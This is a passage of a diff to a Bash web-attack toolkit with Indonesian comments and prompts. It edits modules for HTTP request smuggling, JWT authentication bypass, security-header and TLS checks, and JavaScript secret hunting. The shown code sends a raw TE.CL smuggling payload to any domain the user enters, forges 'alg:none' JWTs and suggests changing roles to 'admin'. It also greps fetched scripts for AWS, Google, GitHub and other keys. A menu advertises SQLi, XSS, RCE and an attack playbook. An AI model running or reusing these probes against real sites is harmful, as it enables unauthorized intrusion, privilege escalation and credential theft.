-    echo -e "  ${OK} CL.TE Result: ${color_smug}$result_clte${NC}"
-    printf "%-15s | %-20s | %-15s\n" "CL.TE" "Time-Delay" "$result_clte" >> "$filename"
+    # --- TEKNIK 2: TE.CL ---
+    echo -ne "  ${INFO} Testing TE.CL (Transfer-Encoding / Content-Length)... "
+    res_tecl=$(python3 -c "
+import socket, time
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(6)
+try:
+    s.connect(('$domain', 80))
+    payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX'
+    s.sendall(payload.encode())
+    s.recv(1024)
+    print('SECURE')
+except socket.timeout:
+    print('VULNERABLE')
+except:
+    print('ERROR')
+" 2>/dev/null)
 
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    if [[ "$res_tecl" == "VULNERABLE" ]]; then
+        echo -e "${R}${BLINK}VULNERABLE (Timeout Detected)${NC}"
+        echo "TE.CL: VULNERABLE - Frontend forwarded incomplete chunked body." >> "$filename"
+    else
+        echo -e "${G}SECURE${NC}"
+        echo "TE.CL: SECURE" >> "$filename"
+    fi
+
+    echo -e "-----------------------------------------------------------------------------"
+    echo -e "${INFO} Audit selesai. Laporan tersimpan di ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
 function start_jwt_hack {
     clear
-    local nama_modul="JWT HACKER"
+    local nama_modul="JWT HACKER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                  MODUL 18: JWT DEBUGGER & AUTH BYPASS HACK                  "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 18: JWT DEBUGGER & AUTH BYPASS PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
     echo -e "${INFO} Dekode Token, Manipulasi Payload, dan None-Algorithm Attack."
     echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan Token JWT: ${W}"
-    read jwt_token
-
+    echo -ne "${Q} Masukkan Token JWT: ${W}"; read jwt_token
     if [[ -z "$jwt_token" || "$jwt_token" != *"."* ]]; then
         echo -e "${ERR} Format JWT tidak valid!"; return
     fi
 
-    local filename="JWT_AUDIT_$(date +%s).txt"
-
+    local filename="JWT_PRO_AUDIT_$(date +%s).txt"
+    
+    # Dekode Bagian JWT
     header_b64=$(echo "$jwt_token" | cut -d'.' -f1)
     payload_b64=$(echo "$jwt_token" | cut -d'.' -f2)
-
-    echo -e "\n${INFO} ${B}Hasil Dekode:${NC}"
     header_json=$(echo "$header_b64" | base64 -d 2>/dev/null)
     payload_json=$(echo "$payload_b64" | base64 -d 2>/dev/null)
 
+    echo -e "\n${INFO} ${B}Analisis Struktur:${NC}"
     echo -e "  ${OK} ${C}[HEADER]${NC}  : ${W}$header_json${NC}"
     echo -e "  ${OK} ${C}[PAYLOAD]${NC} : ${W}$payload_json${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "              JWT VULNERABILITY REPORT               "
-        echo "====================================================="
-        printf "%-25s | %-25s\n" "SECURITY TEST" "RESULT / POC"
-        echo "-----------------------------------------------------"
-        
-        # Test 1: None Algorithm Attack
-        # Kita buat header baru dengan alg: none
-        new_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
-        none_jwt="${new_header}.${payload_b64}."
-        
-        echo -e "  ${ERR} ${Y}Bypass POC (None Alg):${NC} ${DG}$none_jwt${NC}"
-        printf "%-25s | %-25s\n" "None Algorithm Attack" "$none_jwt"
-        
-        # Test 2: Role Check
-        if [[ "$payload_json" == *"user"* || "$payload_json" == *"member"* ]]; then 
-            role_res="POTENTIAL ROLE MOD"; 
-            echo -e "  ${ERR} ${Y}Role Manipulation:${NC} Terdeteksi claim 'user/member'. Coba ganti ke 'admin'."
-        else 
-            role_res="SECURE/UNKNOWN"; 
-        fi
-        printf "%-25s | %-25s\n" "Role Manipulation" "$role_res"
+        echo "JWT PRO AUDIT REPORT"
+        echo "DATE : $(date)"
+        echo "---------------------------------------------------------------------------"
+        printf "%-25s | %-45s\n" "SECURITY TEST" "RESULT / PROOF OF CONCEPT"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    echo -e "\n${OK} Analisis Selesai. Laporan & POC tersimpan di: ${DG}$filename${NC}"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    # --- PROGRESS BAR START ---
+    steps=("None-Alg Attack" "Role Manipulation" "Key Confusion Check")
+    total=${#steps[@]}
+    
+    for i in "${!steps[@]}"; do
+        current=$((i+1))
+        percent=$(( current * 100 / total ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Testing: [${P}%-20s${NC}] %d%%" "$bar" "$percent"
+
+        case $i in
+            0) # None Alg
+                new_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+                none_jwt="${new_header}.${payload_b64}."
+                echo -e "\n  ${OK} ${Y}None Algorithm:${NC} ${DG}$none_jwt${NC}"
+                printf "%-25s | %-45s\n" "None Algorithm" "$none_jwt" >> "$filename"
+                ;;
+            1) # Role Check
+                if [[ "$payload_json" =~ (user|member|guest) ]]; then
+                    echo -e "  ${OK} ${R}Role Discovery:${NC} Terdeteksi claim sensitif. Potensi Elevasi Hak Akses."
+                    printf "%-25s | %-45s\n" "Role Manipulation" "VULNERABLE (Found: user/member)" >> "$filename"
+                else
+                    printf "%-25s | %-45s\n" "Role Manipulation" "SECURE" >> "$filename"
+                fi
+                ;;
+        esac
+        sleep 0.5
+    done
+
+    echo -ne "\r                                                                             \r"
+    echo -e "-----------------------------------------------------------------------------"
+    echo -e "${OK} Analisis Selesai. Hasil & PoC: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_security_audit {
     clear
-    local nama_modul="SECURITY AUDIT"
+    local nama_modul="SECURITY AUDIT PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 19: SECURITY HEADERS & SSL ANALYZER                   "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 19: SECURITY HEADERS & SSL ANALYZER PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Audit Hardening Web Server dan Protokol Enkripsi."
+    echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan Domain (contoh: site.com): ${W}"
-    read domain
-    if [[ -z "$domain" ]]; then return; fi
+    echo -ne "${Q} Masukkan Domain (cth: site.com): ${W}"; read domain
+    [[ -z "$domain" ]] && return
     
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_SECURITY_AUDIT.txt"
-    
-    echo -e "\n${INFO} Memulai Audit pada: ${W}$domain"
-    echo -e "${INFO} File Log: ${DG}$filename${NC}"
+    local filename="${domain^^}_SEC_PRO.txt"
+    echo -e "\n${INFO} Scanning: ${W}$domain"
+    echo -e "${INFO} Log File: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
-        echo "====================================================="
-        echo "          HTTP HEADERS & SSL AUDIT REPORT            "
-        echo "====================================================="
-        echo "TARGET : $domain"
-        printf "%-30s | %-15s\n" "SECURITY CHECK" "STATUS"
-        echo "-----------------------------------------------------"
+        echo "SECURITY & SSL PRO AUDIT - $domain"
+        echo "---------------------------------------------------------------------------"
+        printf "%-30s | %-15s | %-15s\n" "SECURITY CHECK" "STATUS" "LEVEL"
+        echo "---------------------------------------------------------------------------"
     } > "$filename"
 
-    # 1. Header Analysis
-    echo -e "${INFO} Menganalisis HTTP Headers..."
-    headers=$(curl -s -I -k --connect-timeout 10 "https://$domain")
-    check_list=("Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy")
+    # Header List
+    headers_to_check=("Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy")
+    total=${#headers_to_check[@]}
+    current=1
 
-    for h in "${check_list[@]}"; do
-        if echo "$headers" | grep -qi "$h"; then
-            status="FOUND (SAFE)"
-            echo -e "  ${OK} $h: ${G}SAFE${NC}"
+    # 1. Header Scan
+    res_headers=$(curl -s -I -k --connect-timeout 10 "https://$domain")
+    for h in "${headers_to_check[@]}"; do
+        percent=$(( current * 100 / (total+1) ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Headers: [${P}%-20s${NC}] %d%%" "$bar" "$percent"
+
+        if echo "$res_headers" | grep -qi "$h"; then
+            echo -e "\n  ${OK} $h: ${G}PRESENT${NC}"
+            printf "%-30s | %-15s | %-15s\n" "$h" "FOUND" "SAFE" >> "$filename"
         else
-            status="MISSING (RISK)"
-            echo -e "  ${ERR} $h: ${R}MISSING${NC}"
+            echo -e "\n  ${ERR} $h: ${R}MISSING${NC}"
+            printf "%-30s | %-15s | %-15s\n" "$h" "MISSING" "CRITICAL" >> "$filename"
         fi
-        printf "%-30s | %-15s\n" "$h" "$status" >> "$filename"
+        ((current++))
     done
 
-    # 2. SSL Analysis (Legacy Protocol Check)
-    echo -e "\n${INFO} Mengecek Kerentanan SSL (TLS 1.0/1.1)..."
-    # Menggunakan timeout untuk menghindari hang
+    # 2. SSL Protocol Check
+    printf "\r${INFO} Protocols: [${P}====================${NC}] 100%%"
     timeout 5 openssl s_client -connect "$domain":443 -tls1 < /dev/null > /dev/null 2>&1
     if [ $? -eq 0 ]; then
-        ssl_res="VULN (TLS 1.0)"
-        echo -e "  ${ERR} SSL: ${R}Mendukung TLS 1.0 (Rentan POODLE/BEAST)${NC}"
+        echo -e "\n  ${ERR} SSL TLS 1.0: ${R}ENABLED (VULNERABLE)${NC}"
+        printf "%-30s | %-15s | %-15s\n" "TLS 1.0" "ENABLED" "VULNERABLE" >> "$filename"
     else
-        ssl_res="SAFE (No TLS 1.0)"
-        echo -e "  ${OK} SSL: ${G}TLS 1.0 Tidak Aktif${NC}"
+        echo -e "\n  ${OK} SSL TLS 1.0: ${G}DISABLED (SAFE)${NC}"
+        printf "%-30s | %-15s | %-15s\n" "TLS 1.0" "DISABLED" "SAFE" >> "$filename"
     fi
-    printf "%-30s | %-15s\n" "SSL/TLS Protocol" "$ssl_res" >> "$filename"
 
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -e "\n${OK} Laporan lengkap tersimpan di: ${DG}$filename${NC}"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -e "\n-----------------------------------------------------------------------------"
+    echo -e "${OK} Audit Lengkap: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
+
 function start_js_scanner {
     clear
-    local nama_modul="JS SECRET FINDER"
+    local nama_modul="JS SECRET FINDER PRO"
     
     echo -e "${C}============================================================================="
-    echo -e "                 MODUL 20: JAVASCRIPT SECRET & API KEY FINDER                "
-    echo -e "=============================================================================${NC}"
+    echo -e "                ${W}${BOLD}MODUL 20: JAVASCRIPT SECRET & API KEY PRO${NC}                "
+    echo -e "${C}=============================================================================${NC}"
+    echo -e "${INFO} Deep Scan pada file JS untuk mencari API Key, Webhooks, dan Kredensial."
+    echo "-----------------------------------------------------------------------------"
 
-    echo -ne "${Q} Masukkan URL File JS (contoh: https://site.com/app.js): ${W}"
-    read js_url
-    if [[ -z "$js_url" ]]; then return; fi
+    echo -ne "${Q} Masukkan URL File JS (cth: https://site.com/main.js): ${W}"; read js_url
+    [[ -z "$js_url" ]] && return
 
     local domain=$(echo "$js_url" | awk -F[/:] '{print $4}')
-    [[ -z "$domain" ]] && domain="external_js"
-    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
-    local filename="${domain_clean^^}_JS_SECRETS.txt"
+    local filename="${domain^^}_JS_PRO.txt"
 
-    echo -e "\n${INFO} Mengunduh dan menganalisis file JS..."
-    js_content=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$js_url")
+    echo -e "\n${INFO} Downloading & Analyzing: ${W}$js_url"
+    js_content=$(curl -s -k -L --connect-timeout 10 "$js_url")
 
     if [[ -z "$js_content" ]]; then
-        echo -e "${ERR} Gagal mengambil konten JS atau file kosong."; return
+        echo -e "${ERR} Gagal memuat file JS!"; return
     fi
 
-    {
-        echo "====================================================="
-        echo "           JAVASCRIPT STATIC ANALYSIS REPORT         "
-        echo "====================================================="
-        echo "SOURCE URL : $js_url"
-        printf "%-20s | %-40s\n" "CATEGORY" "MATCHED DATA"
-        echo "-----------------------------------------------------"
-    } > "$filename"
-
-    echo -e "${INFO} Menjalankan Regex Hunting..."
-    found_secrets=0
-
-    # Array of Regex Patterns: [Name]|[Regex]
+    # Regex patterns dengan kategori
     patterns=(
         "Google API Key|AIza[0-9A-Za-z\\-_]{35}"
         "AWS Access Key|AKIA[0-9A-Z]{16}"
         "Firebase URL|[a-z0-9.-]+\\.firebaseio\\.com"
-        "Slack Webhook|https://hooks.slack.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+"
-        "Generic API Key|(?i)api_key[\"']?\s*[:=]\s*[\"']?([a-fA-F0-9]{32,})[\"']?"
-        "Authorization|(?i)bearer\s+[a-zA-Z0-9\-\._~+/]+=*"
+        "Slack Webhook|hooks.slack.com/services/"
+        "GitHub Token|[gG][iI][tT][hH][uU][bB].*['\"][0-9a-zA-Z]{35,40}['\"]"
+        "Cloudinary|cloudinary://[0-9]{15}"
     )
 
-    for p in "${patterns[@]}"; do
-        cat_name=$(echo "$p" | cut -d'|' -f1)
-        regex=$(echo "$p" | cut -d'|' -f2)
-        
+    {
+        echo "JS STATIC ANALYSIS PRO REPORT"
+        echo "SOURCE: $js_url"
+        echo "---------------------------------------------------------------------------"
+        printf "%-25s | %-45s\n" "CATEGORY" "MATCHED SECRET"
+        echo "---------------------------------------------------------------------------"
+    } > "$filename"
+
+    found=0
+    total_p=${#patterns[@]}
+    
+    for i in "${!patterns[@]}"; do
+        cat_name=$(echo "${patterns[$i]}" | cut -d'|' -f1)
+        regex=$(echo "${patterns[$i]}" | cut -d'|' -f2)
+
+        # Progress bar
+        percent=$(( (i+1) * 100 / total_p ))
+        bar_len=$(( percent / 5 ))
+        bar=$(printf "%${bar_len}s" | tr ' ' '=')
+        printf "\r${INFO} Hunting: [${P}%-20s${NC}] %d%%" "$bar" "$percent"
+
         match=$(echo "$js_content" | grep -oE "$regex" | head -n 1)
-        
         if [[ -n "$match" ]]; then
-            echo -e "  ${OK} Terdeteksi ${W}$cat_name: ${G}$match${NC}"
-            printf "%-20s | %-40s\n" "$cat_name" "$match" >> "$filename"
-            ((found_secrets++))
+            echo -e "\n  ${OK} Found ${W}$cat_name${NC}: ${G}$match${NC}"
+            printf "%-25s | %-45s\n" "$cat_name" "$match" >> "$filename"
+            ((found++))
         fi
     done
 
-    if [ $found_secrets -eq 0 ]; then
-        echo -e "  ${INFO} Tidak ditemukan rahasia umum (API Key/Credentials)."
-        echo "RESULT: NO SECRETS FOUND" >> "$filename"
-    fi
-
-    echo "-----------------------------------------------------" >> "$filename"
-    echo -e "\n${OK} Analisis Selesai. Temuan disimpan di: ${DG}$filename${NC}"
-    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
-    read
+    echo -ne "\r                                                                             \r"
+    echo -e "-----------------------------------------------------------------------------"
+    echo -e "${OK} Hunting Selesai. Total temuan: ${G}$found${NC}"
+    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
+    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
 }
 
 function start_report_generator {
@@ -2045,30 +2177,35 @@ function check_redos_vulnerability {
 # --- [ LOOP MENU UTAMA: PROFESSIONAL VERSION ] ---
 while true; do
     clear
-    show_banner
+    
     
     echo -e "${DG}  [ Ver 1.5 Professional ]  [ Status: Multi-threaded Enabled ]  [ 2025 ]${NC}"
     echo -e "${W}=============================================================================${NC}"
     echo -e " ${R}${BOLD}[ SERVER-SIDE ]${NC}                        ${G}${BOLD}[ CLIENT-SIDE & CLOUD ]${NC}"
-    echo -e " [01] LFI Scanner                     [11] SSRF Tester"
-    echo -e " [02] SQL Injection (SQLi)            [12] CORS Misconfig Scanner"
-    echo -e " [03] Cross-Site Scripting (XSS)      [13] Subdomain Takeover"
-    echo -e " [04] Admin Panel Finder              [14] Cloud Bucket (S3/GCP)"
-    echo -e " [05] Sensitive File (.env/.git)      [15] API Endpoint Discovery"
-    echo -e " [10] Remote Code Execution (RCE)     [20] JS Secrets Analysis"
+    echo -e " [01] LFI Scanner                      [11] SSRF Tester"
+    echo -e " [02] SQL Injection (SQLi)             [12] CORS Misconfig Scanner"
+    echo -e " [03] Cross-Site Scripting (XSS)       [13] Subdomain Takeover"
+    echo -e " [04] Admin Panel Finder               [14] Cloud Bucket (S3/GCP)"
+    echo -e " [05] Sensitive File (.env/.git)       [15] API Endpoint Discovery"
+    echo -e " [10] Remote Code Execution (RCE)      [20] JS Secrets Analysis"
     echo ""
-    echo -e " ${B}${BOLD}[ RECON & INFRA ]${NC}                      ${Y}${BOLD}[ AUTH & ADVANCED ]${NC}"
-    echo -e " [06] Subdomain Enumerator            [16] IDOR Tester (Turbo)"
-    echo -e " [07] Directory Bruter (Turbo)        [17] HTTP Request Smuggling"
-    echo -e " [08] Port Scan & Services            [18] JWT Debugger & Hack"
-    echo -e " [09] CMS Vulnerability Scan          [19] SSL & Security Headers"
-    echo -e " [22] ReDoS Vulnerability             [21] ATTACK PLAYBOOK"
+    echo -e " ${B}${BOLD}[ RECON & INFRA ]${NC}                       ${Y}${BOLD}[ AUTH & ADVANCED ]${NC}"
+    echo -e " [06] Subdomain Enumerator             [16] IDOR Tester (Turbo)"
+    echo -e " [07] Directory Bruter (Turbo)         [17] HTTP Request Smuggling"
+    echo -e " [08] Port Scan & Services             [18] JWT Debugger & Hack"
+    echo -e " [09] CMS Vulnerability Scan           [19] SSL & Security Headers"
+    echo -e " [22] ReDoS Vulnerability              [21] ATTACK PLAYBOOK"
     echo -e "${W}-----------------------------------------------------------------------------${NC}"
-    echo -e " ${C}${BOLD}[99] EXPORT PROFESSIONAL REPORT${NC}      ${R}${BOLD}[00] EXIT PROGRAM${NC}"
+    echo -e " ${C}${BOLD}[99] EXPORT PROFESSIONAL REPORT${NC}      ${R}${BOLD}[00/Enter] EXIT PROGRAM${NC}"
     echo -e "${W}=============================================================================${NC}"
     
     echo -ne "${C}${BOLD}WEBTESTER${NC} > ${W}Pilih Modul [01-22/99]: ${NC}"
     read menu_choice
+
+    # --- LOGIKA AUTO-EXIT JIKA KOSONG ---
+    if [[ -z "$menu_choice" ]]; then
+        menu_choice="00"
+    fi
 
     case $menu_choice in
         01|1) start_scanner ;;           
@@ -2095,12 +2232,12 @@ while true; do
         22) check_redos_vulnerability ;; 
         99) start_report_generator ;;    
         00|0) 
-            echo -e "\n${Y}[!] Membersihkan sesi...${NC}"
-            sleep 1
-            echo -e "${G}[✓] Terima kasih. Sampai jumpa di puncak!${NC}"
+            echo -e "\n${Y}[!] Membersihkan sesi dan mematikan engine...${NC}"
+            sleep 0.5
+            echo -e "${G}[✓] Terima kasih Bree. Sampai jumpa di puncak!${NC}"
             exit 0 ;;
         *)
-            echo -e "\n${R}[!] Pilihan '$menu_choice' tidak tersedia.${NC}"
+            echo -e "\n${R}[!] Pilihan '$menu_choice' tidak valid.${NC}"
             sleep 1 ;;
     esac
 done
